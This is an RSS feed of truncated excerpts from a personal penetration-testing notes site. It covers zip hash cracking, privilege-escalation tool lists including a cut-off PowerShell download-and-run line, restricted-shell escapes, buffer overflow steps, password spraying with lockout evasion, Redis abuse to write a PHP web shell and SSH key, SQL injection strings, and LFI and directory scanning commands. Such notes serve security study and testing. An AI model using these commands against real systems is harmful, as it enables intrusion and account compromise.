<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>general on My notes and snippets</title><link>https://dev-hugo.justin-p.me/tags/general/</link><description>Recent content in general on My notes and snippets</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 26 Jan 2021 17:33:35 +0100</lastBuildDate><atom:link href="https://dev-hugo.justin-p.me/tags/general/index.xml" rel="self" type="application/rss+xml"/><item><title>general</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/</link><pubDate>Tue, 26 Jan 2021 17:33:35 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/</guid><description>general Buffer Overflow
Buffer Overflowaaaaaaaaaaaaaaaaaaaaaaaaaa.
Discover Open Ports
SCAN ALL THE THINGS!
encrypted password protected pdf
Show me the hidden goods.
encrypted password protected zip
Show me the hidden goods.
Password Spraying
Spray it baby, spray it good.
post compromise recon
post compromise recon.</description></item><item><title>encrypted password protected zip</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/crack-password-protected-zip/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/crack-password-protected-zip/</guid><description>encrypted password protected zip During your work you might stumble upon an password protected zip. It&amp;rsquo;s possible to extract a password hash that can be cracked with hashcat/john.
zip2john extract zip hash
zip2john crackme.zip &amp;gt; crackeziphash.txt ver 2.0 efh 5455 efh 7875 crackme.zip/DoNotTouch PKZIP Encr: 2b chk, TS_chk, cmplen=335181, decmplen=884736, crc=E8183254 hashcat format remove zipfilename
zip2john crackme.zip | cut -d &amp;quot;:&amp;quot; -f 2 &amp;gt; ziphash.txt ver 2.0 efh 5455 efh 7875 crackme.</description></item><item><title>priv esc</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/priv-esc/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/priv-esc/</guid><description>priv esc Just because you pop&amp;rsquo;ed a shell doenst mean its game over. Sometimes you find your self in a low privilage process and in order to compromise the host fully you would need to escalate your privileges
Checklists g0tmi1k Linux Privilege Escalation hacktricks Linux Privilege Escalation fuzzysecurity Windows Privilege Escalation PowerSploit - PowerUp PayloadAllTheThings Scripts linPEAS winPEAS linenum MSF - local_exploit_suggester AonCyberLabs/Windows-Exploit-Suggester jondonas/linux-exploit-suggester-2 RastaMouse/Sherlock powershell &amp;quot;IEX(New-Object Net.</description></item><item><title>shell escaping</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/shell-escaping/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/shell-escaping/</guid><description>shell escaping Sometimes you find your self in a locked down/pseudo shell, for example some network appliance. But under the hood it might run a full unix OS. If this is the case you might be able to use some existing programs that might be available to escape from this pseudo shell.
editors vim :!/bin/sh :set shell=/bin/sh :shell ed !'/bin/sh' ne Load Prefs nano CTRL+R CTRL+X reset; bash 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0 Pager More/Less Open a file that is larger then your terminal.</description></item><item><title>Buffer Overflow</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/buffer-overflow/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/buffer-overflow/</guid><description>Buffer Overflow This is mainly aimed at beginner/OCSP level BO.
Steps Crash The Application Spiking Fuzzing Find EIP Offset Control ESP Identify Bad Characters Find JMP ESP Generate Shell Code Exploit Definitions EIP The Extended Instruction Pointer (EIP) is a register that contains the address of the next instruction for the program or command. ESP The Extended Stack Pointer (ESP) is a register that lets you know where on the stack you are and allows you to push data in and out of the application.</description></item><item><title>Password Spraying</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/password-spraying/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/password-spraying/</guid><description>Password Spraying Once you have found several valid usernames/e-mail address you can try some common passwords with each of the discovered users. (Keep in mind the password and lockout policy of the environment, by default in Active Directory the minimum password length is 7 and lockout is 5.)
Microsoft Online MSOLSpray
Watch out for AzureAD Smart lockout. Use fireprox and/or the delay param.
Web with Burp Website login POST -&amp;gt; intruder -&amp;gt; clear $ -&amp;gt; Highlight user param -&amp;gt; set password -&amp;gt; Attacktype Sniper -&amp;gt; payload 1, user list -&amp;gt; run</description></item><item><title>post compromise recon</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/post-compermise-recon/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/post-compermise-recon/</guid><description>Post compromise recon Once you landed your self a shell or some credentials you need to ask your self a couple of questions.
Who do we have access as ? What roles do we have ? is MFA enabled ? What can we access ? Who are the admins and how are we going to escalate to one ? Are there any security protections in place ? Onprem infrastructure Active Directory BloodHound PowerView RSAT Cloud Infrastucture AWS Use recon_all module of wierd all to gather a lot of info about our current permissions.</description></item><item><title>Redis</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/redis-exploitation/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/redis-exploitation/</guid><description>Redis If you can access a reddis instance there might be a couple of fun things you can do.
Webshell You must know the path of the Web site folder:
root@machine:~# redis-cli -h 10.10.10.10 10.85.0.52:6379&amp;gt; config set dir /usr/share/nginx/html OK 10.85.0.52:6379&amp;gt; config set dbfilename redis.php OK 10.85.0.52:6379&amp;gt; set test &amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot; OK 10.85.0.52:6379&amp;gt; save OK SSH Generate a ssh public-private key pair on your pc: ssh-keygen -t rsa Write the public key to a file : (echo -e &amp;ldquo;\n\n&amp;rdquo;; cat .</description></item><item><title>SQL Injection</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/sql-injection/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/sql-injection/</guid><description>sql injection SQL injection usually occurs when you ask a user for input, like their username/userid, and instead of a name/id, the user gives you an SQL statement that you will unknowingly run on your database.
External stuff exploit-db ASCII table
Always True 1=1 a=a
Escape/stop mysql # -- #-- MySQL Verison select version()
information Schema Table names SELECT table_schema,table_name FROM information_Schema.tables SELECT CONCAT(table_schema,table_name) FROM information_Schema.tables SELECT CONCAT(table_schema,char(58),table_name) FROM information_Schema.</description></item><item><title>Web</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/web/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/web/</guid><description>gobuster General scan ./go/bin/gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -t 40 -e Bigger wordlist and extensions gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,sql -t 40 -e run trough burpsuite ~/go/bin/gobuster dir -u http://192.168.56.101:12380 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sql,html,txt -t 40 -e -p http://127.0.0.1:8080 kadimus LFI Scan &amp;amp; Exploit Tool (@hc0d3r - P0cL4bs Team)
general scan, through burp and save results kadimus -u http://192.168.56.103/?page=login --proxy http://127.0.0.1:8080 --output outputfile get file kadimus -u http://192.</description></item><item><title>Discover Open Ports</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/port-scanning/</link><pubDate>Tue, 10 Mar 2020 16:33:38 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/port-scanning/</guid><description>Discover Open Ports In order to start testing something you first want to find out if it has any network ports open. Discovering what ports are open and what service is running behind is crucial and should be one of the first things you do after recon.
MOVE TO OWN TOOLS PAGE netdiscover Uses ARP to discover hosts.
netdiscover -r 192.168.1.0/24 MOVE TO OWN TOOLS PAGE masscan Usefull on larger networks where speed is important.</description></item></channel></rss>